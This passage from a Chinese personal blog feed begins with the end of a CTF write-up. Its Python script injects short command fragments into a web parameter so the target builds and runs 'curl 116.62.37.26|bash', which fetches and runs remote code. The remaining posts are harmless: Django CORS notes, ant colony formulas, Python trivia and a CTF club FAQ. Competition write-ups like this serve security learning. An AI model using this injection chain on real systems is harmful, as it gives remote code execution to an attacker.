</span><br><span class="line">    <span class="string">&#x27;&gt;-t\\&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;&gt;\&gt;g&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;ls&gt;&gt;_&#x27;</span>, </span><br><span class="line"></span><br><span class="line">    <span class="comment"># generate `curl 116.62.37.26|bash` </span></span><br><span class="line">    <span class="comment"># take a care about &gt;number. , we should let number be first</span></span><br><span class="line">    <span class="string">&#x27;&gt;sh&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;&gt;ba\\&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;&gt;\|\\&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;26\\&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;7.\\&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;3\\&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;&gt;2.\\&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;6\\&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;&gt;6.\\&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;&gt;11\\&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;&gt;\ \\&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;&gt;rl\\&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;&gt;cu\\&#x27;</span>, </span><br><span class="line"></span><br><span class="line">    <span class="comment"># exec</span></span><br><span class="line">    <span class="string">&#x27;sh _&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;sh g&#x27;</span>, </span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(i) &lt;= <span class="number">5</span> </span><br><span class="line">    r = requests.get(<span class="string">&#x27;http://3dac2ab9.yunyansec.com/?1=&#x27;</span> + quote(i) )</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br></pre></td></tr></table></figure><h2 id="END"><a href="#END" class="headerlink" title="END"></a>END</h2><p>还有两个SQL注入不太会，有空得把sqli-lab先全刷了入个门2333</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> ctf比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> ctf比赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>django踩坑记</title>
      <link href="//p/2020/django%E8%B8%A9%E5%9D%91%E8%AE%B0/"/>
      <url>//p/2020/django%E8%B8%A9%E5%9D%91%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h3 id="python-虚拟环境"><a href="#python-虚拟环境" class="headerlink" title="python 虚拟环境"></a>python 虚拟环境</h3><p>pip install virtualenv<br>pip install virtualenvwrapper-win # windows 使用此命令</p><p>好处,：可以一个环境对应一个项目</p><h3 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h3><p>一直好奇闭包有什么用，直到学了 django 后的登录装饰器</p><p>闭包的应用：装饰器、面向对象</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">装饰器的应用</span></span><br><span class="line"><span class="string">如果需要统计一个函数运行的时间，加上装饰器即可，可简化代码</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func_timer</span>(<span class="params">func</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span>():</span></span><br><span class="line">        start_time = time.time()</span><br><span class="line">        func()</span><br><span class="line">        <span class="built_in">print</span>(time.time() - start_time)</span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line"><span class="meta">@func_timer</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;login success!&#x27;</span>)</span><br><span class="line"></span><br><span class="line">login()</span><br></pre></td></tr></table></figure><h3 id="跨域问题"><a href="#跨域问题" class="headerlink" title="跨域问题"></a>跨域问题</h3><p>在与 setting.py 同级目录新建一个 py 文件。写入如下代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.utils.deprecation <span class="keyword">import</span> MiddlewareMixin</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SolveCrossDomainMiddleware</span>(<span class="params">MiddlewareMixin</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">process_response</span>(<span class="params">self, request, response</span>):</span></span><br><span class="line">        response[<span class="string">&quot;Access-Control-Allow-Credentials&quot;</span>] = <span class="string">&quot;true&quot;</span></span><br><span class="line">        response[<span class="string">&quot;Access-Control-Allow-Origin&quot;</span>] = <span class="string">&quot;http://192.168.123.60:8080&quot;</span></span><br><span class="line">        response[<span class="string">&quot;Access-Control-Allow-Methods&quot;</span>] = [<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span><br><span class="line">        <span class="keyword">return</span> response</span><br></pre></td></tr></table></figure><p>如下图所示</p><p><img src="/img/Memo/django/django1.png" class="lazyload" data-srcset="/img/Memo/django/django1.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="django1.png"></p><p>在 settingpy 的 MIDDLEWARE 引入， webproject 与自己的项目名字对应，</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;webproject.solveCrossDomain.SolveCrossDomainMiddleware&#x27;</span>,</span><br></pre></td></tr></table></figure><p>如下图所示</p><p><img src="/img/Memo/django/django2.png" class="lazyload" data-srcset="/img/Memo/django/django2.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="django2.png"></p><p>即可解决跨域问题，因为 SolveCrossDomainMiddleware 中已经对 request 和 response 做了处理了</p><h3 id="session-跨域问题"><a href="#session-跨域问题" class="headerlink" title="session 跨域问题"></a>session 跨域问题</h3><p>因为我使用的是 Vue.js + django 前后端分离，因此需要解决 session 跨域问题</p><h4 id="Vue-里加入-因为我使用的是-axios"><a href="#Vue-里加入-因为我使用的是-axios" class="headerlink" title="Vue 里加入 (因为我使用的是 axios"></a>Vue 里加入 (因为我使用的是 axios</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">this</span>.$axios.defaults.withCredentials = <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>如下图所示</p><p><img src="/img/Demo/django/django6.png" class="lazyload" data-srcset="/img/Demo/django/django6.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="django6.png"></p><h4 id="以下为-django-里的操作"><a href="#以下为-django-里的操作" class="headerlink" title="以下为 django 里的操作"></a>以下为 django 里的操作</h4><p>我使用的是 数据库存储 session， 因此 setting.py 引入的是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">MIDDLEWARE = [</span><br><span class="line">...</span><br><span class="line"><span class="string">&#x27;django.contrib.sessions.middleware.SessionMiddleware&#x27;</span>,</span><br><span class="line">...</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">SESSION_ENGINE = <span class="string">&#x27;django.contrib.sessions.backends.db&#x27;</span>  <span class="comment"># 引擎（默认）</span></span><br><span class="line"></span><br><span class="line">SESSION_COOKIE_NAME = <span class="string">&quot;sessionid&quot;</span>                <span class="comment"># Session的cookie保存在浏览器上时的key，即：sessionid＝随机字符串（默认）</span></span><br><span class="line">SESSION_COOKIE_PATH = <span class="string">&quot;/&quot;</span>                        <span class="comment"># Session的cookie保存的路径（默认）</span></span><br><span class="line">SESSION_COOKIE_DOMAIN = <span class="literal">None</span>                     <span class="comment"># Session的cookie保存的域名（默认）</span></span><br><span class="line">SESSION_COOKIE_SECURE = <span class="literal">False</span>                    <span class="comment"># 是否Https传输cookie（默认）</span></span><br><span class="line">SESSION_COOKIE_HTTPONLY = <span class="literal">True</span>                   <span class="comment"># 是否Session的cookie只支持http传输（默认）</span></span><br><span class="line">SESSION_COOKIE_AGE = <span class="number">3600</span>                        <span class="comment"># Session的cookie失效日期（默认2周）</span></span><br><span class="line">SESSION_EXPIRE_AT_BROWSER_CLOSE = <span class="literal">False</span>          <span class="comment"># 是否关闭浏览器使得Session过期（默认）</span></span><br><span class="line">SESSION_SAVE_EVERY_REQUEST = <span class="literal">False</span>               <span class="comment"># 是否每次请求都保存Session，默认修改之后才保存（默认）</span></span><br><span class="line"><span class="comment"># !!! 这个一定要加.....</span></span><br><span class="line">SESSION_COOKIE_SAMESITE = <span class="literal">None</span>                   <span class="comment"># 默认为 Lax, 即 get 可跨域, 而 post 不可以</span></span><br></pre></td></tr></table></figure><p>如下图红线区所示</p><p><img src="/img/Memo/django/django3.png" class="lazyload" data-srcset="/img/Memo/django/django3.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="django3.png"></p><p>在 Vue.js 前端引入</p><h3 id="migrate-无报错，迁移后数据库没有增加表"><a href="#migrate-无报错，迁移后数据库没有增加表" class="headerlink" title="migrate 无报错，迁移后数据库没有增加表"></a>migrate 无报错，迁移后数据库没有增加表</h3><p>我是手动直接删除了 migrations 里面的文件和数据库里面的表格，，然后我改了 models.py 后 makemigrations &amp;&amp; migrate 数据库竟然没有多出表。</p><p><img src="/img/Memo/django/django4.png" class="lazyload" data-srcset="/img/Memo/django/django4.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="django4.png"></p><p>原来 django 数据库里面，是有这个表格的</p><p><img src="/img/Memo/django/django5.png" class="lazyload" data-srcset="/img/Memo/django/django5.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="django5.png"></p><p>里面存放着关于数据库迁移的信息，所以我手动删除了迁移表和数据后并没有什么乱用，数据库以为它还是在的，，所以，我选择了删除所以表格，，重新 makemigrations &amp;&amp; migrate 就好了。</p><h4 id="因为这是个人作业，，所以随便删了，生产环境慎用。。。"><a href="#因为这是个人作业，，所以随便删了，生产环境慎用。。。" class="headerlink" title="因为这是个人作业，，所以随便删了，生产环境慎用。。。**"></a>因为这是个人作业，，所以随便删了，生产环境慎用。。。**</h4>]]></content>
      
      
      <categories>
          
          <category> 开发 </category>
          
          <category> Python </category>
          
          <category> Django </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 开发 </tag>
            
            <tag> Python </tag>
            
            <tag> Django </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算智能实验</title>
      <link href="//p/2019/%E8%AE%A1%E7%AE%97%E6%99%BA%E8%83%BD%E5%AE%9E%E9%AA%8C/"/>
      <url>//p/2019/%E8%AE%A1%E7%AE%97%E6%99%BA%E8%83%BD%E5%AE%9E%E9%AA%8C/</url>
      
        <content type="html"><![CDATA[<h2 id="蚁群算法"><a href="#蚁群算法" class="headerlink" title=":) 蚁群算法"></a>:) 蚁群算法</h2><h3 id="AS求解-TSP-参数一览-设任意两个城市的距离-d-ij-为欧几里德距离"><a href="#AS求解-TSP-参数一览-设任意两个城市的距离-d-ij-为欧几里德距离" class="headerlink" title="AS求解 TSP 参数一览(设任意两个城市的距离 $d_{ij}$ 为欧几里德距离)"></a>AS求解 TSP 参数一览(设任意两个城市的距离 $d_{ij}$ 为欧几里德距离)</h3><ul><li>AS 中的随机比例规则(random proportional): 对于每只蚂蚁 k,<br>  路径记忆向量 $R^{k}$ 按照访问顺序记录了所有 k 已经经过的程序序号</li></ul><br><ul><li>$ \tau_{o}(i, j) = \frac{m}{C^{nn}} $, m是蚂蚁个数, $C^{nn}$ 是由贪婪算法构造的路径的长度</li></ul><br><ul><li>设蚂蚁 k 当前所在城市为 i, 则其选择城市 j 作为下一个访问对象的概率为:</li></ul><p>$$<br>p_{k}(i,j) = \begin{cases}<br>\frac{[\tau(i, j) ]^{\alpha} [\eta(i, j)^{\beta } ]}{\sum_{u \in J_{k}(i)  }[\tau(i, u) ]^{\alpha} [\eta(i, u)^{\beta } ]} &amp; \text , ; j \in J_{k}(i) \<br>;;;;;;;;;;;; 0 &amp; \text , ; other<br>\end{cases}<br>$$</p><ul><li><ul><li>$J_{k}(i)$ 表示从城市 i 可以直接到达的且又不在蚂蚁访问过的城市序列 $R^{k}$ 中的城市集合</li><li>$\eta(i, j)$ 是一个启发式信息, 通常由 $\eta(i, j) = \frac{1}{d_{ij}}$ 直接计算</li><li>$\tau(i, j)$ 表示边 (i, j) 上的信息素量</li><li>$\alpha$ 和 $\beta $ 是两个预先设置的参数, 实验表明 $\alpha$ = 1, $\beta $ = 2 ~ 5 比较合适</li></ul></li></ul><br><ul><li>城市 i 与 城市 j 的相连边上的信息素量 $\tau_(i, j)$ 按如下公式进行更新:</li></ul><p>$$<br>\tau(i, j) = (1 - \rho) \cdot \tau(i, j) + \sum_{ k=1 }^{m} \Delta \tau_{k}(i, j)<br>\<br>\Delta \tau_{k}(i, j) = \begin{cases}<br>(C_{k})^{-1} &amp; , ; (i, j) \in R^{k} \<br>0 &amp; ,; other<br>\end{cases}<br>$$</p><ul><li><ul><li>m 是蚂蚁个数</li><li>$\rho$ 是信息素的蒸发率, 规定 $0 &lt; \rho \leqslant 1 $ , $\rho$ 通常设置为 = 0.5</li><li>$\Delta \tau_{k}(i, j)$ 是第 k 只蚂蚁在它经过的边上释放的信息素量(没放过当然就取 0 啦！), 它等于蚂蚁 k 本轮构建路径长度的倒数</li><li>$C_{k}$ 表示路径长度, 它是 $R^{k}$ 中所有边的长度和</li></ul></li></ul><h3 id="ACS-与-AS-的不同的三个方面参数一览"><a href="#ACS-与-AS-的不同的三个方面参数一览" class="headerlink" title="ACS 与 AS 的不同的三个方面参数一览"></a>ACS 与 AS 的不同的三个方面参数一览</h3><p>####状态转移规则，</p><ul><li>ACS中的伪随机比例规则(pseudorandom proportional): 对于每只蚂蚁 k,<br>  路径记忆向量 $R^{k}$ 按照访问顺序记录了所有 k 已经经过的程序序号</li></ul><ul><li>设蚂蚁 k 当前所在城市为 i, 则下一个访问城市:</li></ul><p>$$<br>j = \begin{cases}<br>arg ; max_{j \in J_{k}(i)} {[\tau(i, j) ], [\eta(i, j)^{\beta }]} &amp; \text , ; q \leqslant q_{0} \<br>S &amp; \text , ; other<br>\end{cases}<br>$$</p><ul><li><ul><li>$J_{k}(i)$ 表示从城市 i 可以直接到达的且又不在蚂蚁访问过的城市序列 $R^{k}$ 中的城市集合</li><li>$\eta(i, j)$ 是一个启发式信息, 通常由 $\eta(i, j) = \frac{1}{d_{ij}}$ 直接计算</li><li>$\tau(i, j)$ 表示边 (i, j) 上的信息素量</li><li>$\beta$ 是描述信息素浓度和路径长度信息相对重要性的控制参数</li><li>$q_{0}$ 是一个 [0, 1] 区间内的参数, 当产生的随机数 $q \leqslant q_{0}$ 时, 蚂蚁直接选择使启发式信息与信息素量的 $\beta$ 指数乘积最大的下一城市节点, 我们通常称之为开发(exploitation); 反之, 当产生的随机数 $q &gt; q_{0}$ 时, ACS将和各种AS算法一样使用轮盘赌选择策略, 即偏向探索(biased exploration)</li></ul></li></ul><h4 id="信息素全局更新规则"><a href="#信息素全局更新规则" class="headerlink" title="信息素全局更新规则"></a>信息素全局更新规则</h4><ul><li>不论是信息素的蒸发还是释放, 都只在属于至今最优路径的边上进行</li></ul><p>$$<br>\tau(i, j) = (1 - \rho) \cdot \tau(i, j) + \rho \cdot \Delta \tau_{b}(i, j) , \forall (i, j) \in T_{b}<br>$$</p><ul><li><ul><li>$\Delta \tau_{b}(i, j) = \frac{1}{C_{b}}$</li><li>参数 $\rho$ 代表信息素蒸发的速率, 新增加的信息素 $\Delta \tau_{b}(i, j)$ 被乘上系数 $\rho$ 后, 更新后的信息素浓度被控制在旧信息素量与新释放的信息素量之间, 用一种隐含的又更简单的方式实现了 MMAS 算法中对信息素量取值范围的限制</li></ul></li></ul><h4 id="信息素局部更新规则"><a href="#信息素局部更新规则" class="headerlink" title="信息素局部更新规则"></a>信息素局部更新规则</h4><p>$$<br>\tau(i, j) = (1 - \xi) \cdot \tau(i, j) + \xi \cdot \tau_{0}<br>$$</p><ul><li>$\xi$ 是信息素局部挥发速率, 满足 $0 &lt; \xi &lt; 1$, 通过实验发现 $\xi = 0.1$ </li><li>$\tau_{0}$ 是信息素的初始值, 取值为 $\frac{1}{nC^{nn}}$ 时, 对大多数实例有着非常好的性能. 其中 n 为城市个数, $C^{nn}$ 是由贪婪算法构造的路径的长度</li></ul>]]></content>
      
      
      <categories>
          
          <category> 学校课程 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>记录一些杂乱的东西</title>
      <link href="//p/2019/%E4%B9%B1%E4%B8%83%E5%85%AB%E7%B3%9F/"/>
      <url>//p/2019/%E4%B9%B1%E4%B8%83%E5%85%AB%E7%B3%9F/</url>
      
        <content type="html"><![CDATA[<h4 id="能量是标量这句话意味深远呀-～"><a href="#能量是标量这句话意味深远呀-～" class="headerlink" title="能量是标量这句话意味深远呀 ～"></a>能量是标量这句话意味深远呀 ～</h4><p>一群人纠结了一天这个题目的结果是标量还是矢量，23333</p><p><img src="/img/Memo/memo1.png" class="lazyload" data-srcset="/img/Memo/memo1.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><h4 id="二进制的魅力"><a href="#二进制的魅力" class="headerlink" title="二进制的魅力~"></a>二进制的魅力~</h4><p>老久之前一直想记下来, 一直忘了…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">num_need_validate = <span class="number">123423</span></span><br><span class="line"></span><br><span class="line">cnt = <span class="number">10</span>**<span class="number">7</span></span><br><span class="line"></span><br><span class="line">a = <span class="number">0</span> </span><br><span class="line"></span><br><span class="line">time_start1 = time.time()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(cnt):</span><br><span class="line">    <span class="keyword">if</span> (num_need_validate % <span class="number">2</span>) != <span class="number">0</span>:</span><br><span class="line">        a = a + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 平均在这个数字 2.133270025253296</span></span><br><span class="line"><span class="built_in">print</span>(time.time() - time_start1)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">num_need_validate = <span class="number">123423</span></span><br><span class="line"></span><br><span class="line">cnt = <span class="number">10</span>**<span class="number">7</span></span><br><span class="line"></span><br><span class="line">a = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">time_start2 = time.time()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(cnt):</span><br><span class="line">    <span class="keyword">if</span> (num_need_validate &amp; <span class="number">0</span>) :</span><br><span class="line">        a = a + <span class="number">1</span></span><br><span class="line">        </span><br><span class="line"><span class="comment"># 平均在这个数字 0.8398542404174805</span></span><br><span class="line"><span class="built_in">print</span>(time.time() - time_start2)</span><br></pre></td></tr></table></figure><h4 id="linux-趣事"><a href="#linux-趣事" class="headerlink" title="linux 趣事"></a>linux 趣事</h4><p>一直很好奇 vim 的  hjkl 方向键 以及 ~ 为什么是根目录…<br><a href="https://catonmat.net/why-vim-uses-hjkl-as-arrow-keys">https://catonmat.net/why-vim-uses-hjkl-as-arrow-keys</a></p>]]></content>
      
      
      <categories>
          
          <category> 小记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>佛大2019红帽杯相关咨询</title>
      <link href="//p/2019/2019hmb/"/>
      <url>//p/2019/2019hmb/</url>
      
        <content type="html"><![CDATA[<h3 id="1-什么是CTF"><a href="#1-什么是CTF" class="headerlink" title="1.什么是CTF"></a>1.什么是CTF</h3><p>CTF（Capture The Flag）中文一般译作夺旗赛，在网络安全领域中指的是网络安全技术人员之间进行技术竞技的一种比赛形式。CTF起源于1996年DEFCON全球黑客大会，以代替之前黑客们通过互相发起真实攻击进行技术比拼的方式。</p><h3 id="2-什么是红帽杯"><a href="#2-什么是红帽杯" class="headerlink" title="2.什么是红帽杯"></a>2.什么是红帽杯</h3><p>红帽杯是由广东省计算机信息网络安全协会将于2019年11月在广州举办第三届红帽杯网络安全攻防（CTF）大赛。</p><ul><li>报名时间<br>10月10日00:00 - 11月07日24:00</li><li>初赛时间<br>11月10日09:00 - 11月11日09:00</li></ul><p>报名官方网站 <a href="https://www.cinsa.org.cn/2019redhat">https://www.cinsa.org.cn/2019redhat</a></p><p>欢迎咨询佛大信息安全协会</p><ul><li>微信号：<ul><li>范同学：fjw712452</li><li>刘同学：Glan5812 </li><li>徐同学：Gtari720</li></ul></li></ul><h3 id="3-入门CTF，你需要什么"><a href="#3-入门CTF，你需要什么" class="headerlink" title="3.入门CTF，你需要什么"></a>3.入门CTF，你需要什么</h3><ul><li><p>快速学习新事物的能力<br>  一个不一样的思考方式<br>  一颗乐于解决问题的心<br>  一些有趣的网络安全技术<br>  一段充实奋斗的时光</p></li><li><p>在这里，我们希望能给予你一些建议：</p><p>  善用 Google 搜索可以帮助你更好地提升自己<br>  掌握至少一门编程语言，比如 Python<br>  实践比什么都要管用<br>  保持对技术的好奇与渴望并坚持下去</p></li></ul><h3 id="4-CTF是怎么比赛的"><a href="#4-CTF是怎么比赛的" class="headerlink" title="4.CTF是怎么比赛的"></a>4.CTF是怎么比赛的</h3><p>由于 CTF 的考题范围其实比较宽广，目前也没有太明确的规定界限说会考哪些内容。但是就目前的比赛题型而言的话，主要还是依据常见的 Web 网络攻防、RE 逆向工程、Pwn 二进制漏洞利用、Crypto 密码攻击、Mobile 移动安全 以及 Misc 安全杂项 来进行分类。</p><h4 id="Web-网络攻防"><a href="#Web-网络攻防" class="headerlink" title="Web - 网络攻防"></a>Web - 网络攻防</h4><p>主要为 Web 安全中常见的漏洞，如 SQL 注入、XSS、CSRF、文件包含、文件上传、代码审计、PHP 弱类型等，Web 安全中常见的题型及解题思路，并提供了一些常用的工具。</p><h4 id="Reverse-Engineering-逆向工程"><a href="#Reverse-Engineering-逆向工程" class="headerlink" title="Reverse Engineering - 逆向工程"></a>Reverse Engineering - 逆向工程</h4><p>主要为逆向工程中的常见题型、工具平台、解题思路，进阶部分介绍了逆向工程中常见的软件保护、反编译、反调试、加壳脱壳技术。</p><h4 id="Pwn-二进制漏洞利用"><a href="#Pwn-二进制漏洞利用" class="headerlink" title="Pwn - 二进制漏洞利用"></a>Pwn - 二进制漏洞利用</h4><p>Pwn 题目主要考察二进制漏洞的发掘和利用，需要对计算机操作系统底层有一定的了解。在 CTF 竞赛中，PWN 题目主要出现在 Linux 平台上。</p><h4 id="Crypto-密码攻击"><a href="#Crypto-密码攻击" class="headerlink" title="Crypto - 密码攻击"></a>Crypto - 密码攻击</h4><p>主要包括古典密码学和现代密码学两部分内容，古典密码学趣味性强，种类繁多，现代密码学安全性高，对算法理解的要求较高。</p><h4 id="Mobile-移动安全"><a href="#Mobile-移动安全" class="headerlink" title="Mobile - 移动安全"></a>Mobile - 移动安全</h4><p>主要为安卓逆向中的常用工具和主要问题类型，安卓逆向常常需要一定的安卓开发知识，iOS 逆向题目在 CTF 竞赛中较少出现，因此不作过多介绍。</p><h4 id="Misc-安全杂项"><a href="#Misc-安全杂项" class="headerlink" title="Misc - 安全杂项"></a>Misc - 安全杂项</h4><p>以诸葛建伟翻译的《线上幽灵：世界头号黑客米特尼克自传》和一些典型 MISC 题为切入点，内容主要包括信息搜集、编码分析、取证分析、隐写分析等。</p><h3 id="5-CTF方向那么多，我选择那一条呢"><a href="#5-CTF方向那么多，我选择那一条呢" class="headerlink" title="5.CTF方向那么多，我选择那一条呢"></a>5.CTF方向那么多，我选择那一条呢</h3><ul><li><p>这需要你自己选择一个适合的方向，下面是各个方向的介绍。</p><ul><li><p>A方向：PWN+Reverse+Crypto随机搭配<br>  IDA工具使用（f5插件）、逆向工程、密码学、缓冲区溢出等</p></li><li><p>B方向：Web+Misc<br>  网络安全、内网渗透、数据库安全等</p></li><li><p>公共部分：Linux基础、计算机组成原理、操作系统原理、网络协议分析</p></li></ul></li><li><p>这是简单的介绍，去选择一条属于自己的路吧！</p><ul><li>PWN、Reverse偏重对汇编、逆向的理解</li><li>Crypto偏重对数学、算法的深入学习</li><li>Web偏重对技巧沉淀、快速搜索能力的挑战</li><li>Misc比较复杂，所有与计算机安全挑战有关的都算在其中</li></ul></li></ul><h3 id="6-我选好了路，但是怎么去学习呢"><a href="#6-我选好了路，但是怎么去学习呢" class="headerlink" title="6.我选好了路，但是怎么去学习呢"></a>6.我选好了路，但是怎么去学习呢</h3><p>下面推荐几本书：</p><ul><li><p>A方向：<br>IDA pro权威指南（重要）<br>揭秘家庭路由器0day漏洞挖掘技术<br>RE for Beginners（逆向工程入门）<br>自己动手写操作系统<br>黑客攻防技术宝典：系统实战篇</p></li><li><p>B方向：<br>Web应用安全权威指南（适合小白入门对WEB安全进行宏观的理解）<br>黑客攻防技术宝典 